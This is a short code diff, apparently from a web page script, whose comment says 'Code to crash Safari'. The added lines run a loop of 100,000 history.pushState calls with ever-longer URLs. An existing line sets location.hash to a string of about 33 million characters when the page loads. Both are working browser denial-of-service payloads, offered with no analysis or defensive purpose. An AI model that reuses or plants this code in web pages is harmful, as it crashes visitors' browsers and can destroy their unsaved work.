@@ -27,6 +27,11 @@
       // Code to run in Safari browser
       console.log("This code is running in Safari.");
       // Code to crash Safari
+      var total = "";
+                    for( var i = 0; i < 100000; i++ ) {
+                        total = total + i.toString();
+                        history.pushState(0,0, total );
+                    }
       window.onload=()=>location.hash="M"+"\u0001".repeat(2**25)+"m";
       }
     
